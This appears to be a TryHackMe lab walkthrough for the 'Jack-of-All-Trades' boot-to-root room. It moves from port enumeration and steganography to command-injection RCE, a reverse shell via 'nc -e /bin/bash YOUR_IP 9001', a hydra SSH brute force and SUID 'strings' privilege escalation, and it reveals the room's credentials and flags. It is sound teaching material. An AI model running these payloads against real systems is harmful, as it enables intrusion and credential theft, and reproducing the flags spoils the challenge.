# Jack-of-All-Trades — TryHackMe Walkthrough

> Boot-to-root originally designed for Securi-Tay 2020. Jack is a man of a great many talents. The zoo has employed him to capture the penguins due to his years of penguin-wrangling experience, but all is not as it seems... We must stop him!

<p align="center">
  <a href="https://imgbb.com/"><img src="https://i.ibb.co/WNXcHRrp/baa244c10b8308efe5d3956cc1c73db6.jpg" alt="baa244c10b8308efe5d3956cc1c73db6" border="0"></a>
<p>

<p align="center">
  <a href="https://tryhackme.com/room/jackofalltrades">
    <img src="https://img.shields.io/badge/TryHackMe-Jack--of--All--Trades-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Easy-green">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-Enumeration%20%7C%20Steganography%20%7C%20PrivEsc-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | Web Poking |
| 3 | Cryptography (Base64, Base32, Hex, ROT13) |
| 4 | Steganography |
| 5 | Code Injection (RCE) |
| 6 | Brute Forcing SSH |
| 7 | Abusing SUID/GUID |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Identify services running on non-standard/swapped ports
- Read and analyse HTML page source for hidden clues
- Decode multi-layer encoded strings (Base64, Base32, Hex, ROT13)
- Extract hidden data from images using Steganography tools
- Exploit a command injection vulnerability to gain a reverse shell
- Brute-force SSH credentials using a custom wordlist
- Escalate privileges using a misconfigured SUID binary

---

## Prerequisites
- Basic familiarity with Linux terminal commands
- Nmap, Gobuster, Hydra, and Steghide installed
- Firefox with port override configured (see Note in Question 1)

## Task 1 — Flags

---

### Step 1 — Network Enumeration

**Approach:** Run an aggressive Nmap scan to identify open ports and the services running on them. Pay close attention — the ports on this machine are not what you would normally expect.

```
kali@kali:~/CTFs/tryhackme/Jack-of-All-Trades$ sudo nmap -A -sS -sC -sV -O Machine_IP
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 14:23 CEST
Nmap scan report for Machine_IP
Host is up (0.045s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Jack-of-all-trades!
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   36.04 ms 10.8.0.1
2   36.52 ms Machine_IP

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.50 seconds
```

> **Note:** The ports are intentionally swapped on this machine. HTTP (the website) is running on port **22**, and SSH is running on port **80**. Firefox blocks access to port 22 by default for security reasons. To bypass this, go to `about:config` in Firefox, search for `network.security.ports.banned.override`, create a new String entry, and set its value to `22`. You can then browse to `http://Machine_IP:22`.

---

### Step 2 — Inspecting the Page Source

**Approach:** Navigate to `view-source:http://Machine_IP:22/` to read the raw HTML of the homepage. Look carefully for hidden comments left by Jack.

```html
<html>
	<head>
		<title>Jack-of-all-trades!</title>
		<link href="assets/style.css" rel=stylesheet type=text/css>
	</head>
	<body>
		<img id="header" src="assets/header.jpg" width=100%>
		<h1>Welcome to Jack-of-all-trades!</h1>
		<main>
			<p>My name is Jack. I'm a toymaker by trade but I can do a little of anything -- hence the name!<br>I specialise in making children's toys (no relation to the big man in the red suit - promise!) but anything you want, feel free to get in contact and I'll see if I can help you out.</p>
			<p>My employment history includes 20 years as a penguin hunter, 5 years as a police officer and 8 months as a chef, but that's all behind me. I'm invested in other pursuits now!</p>
			<p>Please bear with me; I'm old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don't worry, I <em>always</em> clear up after myself.</p>
			<p>I love dinosaurs. I have a <em>huge</em> collection of models. Like this one:</p>
			<img src="assets/stego.jpg">
			<p>I make a lot of models myself, but I also do toys, like this one:</p>
			<img src="assets/jackinthebox.jpg">
			<!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
			<!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
			<p>I hope you choose to employ me. I love making new friends!</p>
			<p>Hope to see you soon!</p>
			<p id="signature">Jack</p>
		</main>
	</body>
</html>
```

> **Note:** Two key things are hidden in the source. First, a comment reveals a recovery page at `/recovery.php`. Second, there is a Base64 encoded string hidden in another comment. Always read the page source — developers frequently leave sensitive notes behind.

---

### Step 3 — Decoding the Hidden Base64 String

**Approach:** Copy the Base64 string from the HTML comment and decode it using the `base64` command.

```
kali@kali:~/CTFs/tryhackme/Jack-of-All-Trades$ echo "UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVu Y29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==" | base64 -d

Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```

> **Note:** The decoded message contains a password: **`u?WtKSraq`**. This will be used as a passphrase to extract hidden data from one of the images on the page using Steganography.

---

### Step 4 — Steganography on the Header Image

**Approach:** Download `header.jpg` from the website and use `steghide` to extract any hidden data using the password discovered in the previous step.

```
kali@kali:~/CTFs/tryhackme/Jack-of-All-Trades$ steghide extract -sf header.jpg
Enter passphrase:
wrote extracted data to "cms.creds".
kali@kali:~/CTFs/tryhackme/Jack-of-All-Trades$ cat cms.creds
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY
```

> **Note:** `steghide` is a tool that hides and extracts data embedded within image files. Here, `header.jpg` contained a credentials file for the CMS login. The credentials are: **`jackinthebox:TplFxiSHjY`**.

---

### Step 5 — Decoding the Recovery Page Comment

**Approach:** Navigate to `view-source:http://Machine_IP:22/recovery.php`. Inside the source, find the encoded comment and decode it through multiple layers: Base32 → Hex → ROT13.

```
echo "GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=" | base32 -d | xxd -r -p | tr 'A-Za-z' 'N-ZA-Mn-za-m'

Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
```

> **Note:** This string is encoded in three layers. First decode Base32, then convert from Hex with `xxd -r -p`, then apply ROT13 with `tr`. The hint URL redirects to a Stegosauria Wikipedia page — confirming steganography is the path forward, which we have already completed.

---

### Step 6 — Logging into the Recovery Page and Getting a Shell

**Approach:** Log in to `http://Machine_IP:22/recovery.php` using the credentials found in `cms.creds`. The page accepts a `?cmd=` URL parameter, which means it is vulnerable to Remote Code Execution. Use it to trigger a reverse shell back to your machine.

Start a listener on your machine first:

```
kali@kali:~/CTFs/tryhackme/Jack-of-All-Trades$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.8.106.222] from (UNKNOWN) [Machine_IP] 53706
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
cd /home
ls
jack
jacks_password_list
cat jacks_password_list
*hclqAzj+2GC+=0K
eN<A@n^zI?FE$I5,
X<(@zo2XrEN)#MGC
,,aE1K,nW3Os,afb
ITMJpGGIqg1jn?>@
0HguX{,fgXPE;8yF
sjRUb4*@pz<*ZITu
[8V7o^gl(Gjt5[WB
yTq0jI$d}Ka<T}PD
Sc.[[2pL<>e)vC4}
9;}#q*,A4wd{<X.T
M41nrFt#PcV=(3%p
GZx.t)H$&awU;SO<
.MVettz]a;&Z;cAC
2fh%i9Pr5YiYIf51
TDF@mdEd3ZQ(]hBO
v]XBmwAk8vk5t3EF
9iYZeZGQGG9&W4d1
8TIFce;KjrBWTAY^
SeUAwt7EB#fY&+yt
n.FZvJ.x9sYe5s5d
8lN{)g32PG,1?[pM
z@e1PmlmQ%k5sDz@
ow5APF>6r,y4krSo
```

> **Note:** The RCE payload used in the browser is: `http://Machine_IP:22/nnxhweOV/index.php?cmd=nc%20-e%20/bin/bash%20YOUR_IP%209001`. Once the shell connects, navigate to `/home` to discover two items: `jack`'s home directory and a file called `jacks_password_list` — a wordlist of potential SSH passwords.

---

### Step 7 — Brute Forcing SSH

**Approach:** Use `hydra` to brute-force SSH login for the user `jack` using `jacks_password_list`. Remember that SSH is running on port **80** on this machine, not the default port 22.

```
kali@kali:~/CTFs/tryhackme/Jack-of-All-Trades$ hydra -l jack -P jacks_password_list -s 80 Machine_IP ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-14 14:36:49
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:1/p:24), ~2 tries per task
[DATA] attacking ssh://Machine_IP:80/
[80][ssh] host: Machine_IP   login: jack   password: ITMJpGGIqg1jn?>@
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-14 14:36:52
```

> **Note:** The `-s 80` flag tells Hydra to target port 80 instead of the default SSH port. Hydra successfully finds the password: **`jack:ITMJpGGIqg1jn?>@`**.

---

### Question 1 — User Flag

**Approach:** SSH into the machine as `jack` on port 80. List the home directory — you will find `user.jpg`. Transfer it to your machine using Python's HTTP server and open the image to read the flag.

```
jack@jack-of-all-trades:~$ ls -la
total 312
drwxr-x--- 3 jack jack   4096 Feb 29  2020 .
drwxr-xr-x 3 root root   4096 Feb 29  2020 ..
lrwxrwxrwx 1 root root      9 Feb 29  2020 .bash_history -> /dev/null
-rw-r--r-- 1 jack jack    220 Feb 29  2020 .bash_logout
-rw-r--r-- 1 jack jack   3515 Feb 29  2020 .bashrc
drwx------ 2 jack jack   4096 Feb 29  2020 .gnupg
-rw-r--r-- 1 jack jack    675 Feb 29  2020 .profile
-rwxr-x--- 1 jack jack 293302 Feb 28  2020 user.jpg
jack@jack-of-all-trades:~$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
10.8.106.222 - - [14/Oct/2020 13:40:55] "GET /user.jpg HTTP/1.1" 200 -
```

> **Note:** The flag is embedded inside an image file (`user.jpg`) rather than a plain text file. Serve it over HTTP with Python's built-in server, download it on your machine via `wget http://Machine_IP:8000/user.jpg`, then open it to read the flag.

<details>
<summary>Reveal Answer</summary>

**`securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}`**

</details>

---

### Question 2 — Root Flag

**Approach:** First check if `jack` can run any sudo commands. Then search for binaries with the SUID bit set. The `strings` binary has SUID set, meaning it runs as root — use it to read `/root/root.txt` directly.

```
jack@jack-of-all-trades:~$ sudo -l
[sudo] password for jack:
Sorry, user jack may not run sudo on jack-of-all-trades.
jack@jack-of-all-trades:~$ find / -type f -user root -perm -u=s 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/strings
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/procmail
/usr/sbin/exim4
/bin/mount
/bin/umount
/bin/su
jack@jack-of-all-trades:~$ strings /root/root.txt
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}
```

> **Note:** `/usr/bin/strings` has the SUID bit set and is owned by root. The `strings` command prints readable text from any file. Because it runs as root, it can read files that are normally restricted — like `/root/root.txt`. This is a classic SUID misconfiguration. See [GTFOBins/strings](https://gtfobins.github.io/gtfobins/strings/) for more detail.

<details>
<summary>Reveal Answer</summary>

**`securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}`**

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap scan | Discovered HTTP on port 22, SSH on port 80 (swapped) |
| 2 | Page source inspection | Found `/recovery.php` and a hidden Base64 string |
| 3 | Base64 decode | Retrieved steghide passphrase: `u?WtKSraq` |
| 4 | Steghide on `header.jpg` | Extracted CMS credentials: `jackinthebox:TplFxiSHjY` |
| 5 | Recovery page source decode | Confirmed steganography path via Base32 + Hex + ROT13 |
| 6 | RCE via `?cmd=` parameter | Got a reverse shell as `www-data`, found `jacks_password_list` |
| 7 | Hydra SSH brute-force | Cracked `jack`'s SSH password on port 80 |
| 8 | Read `user.jpg` | Found user flag embedded in image |
| 9 | SUID `strings` abuse | Read `/root/root.txt` as root without a full shell |
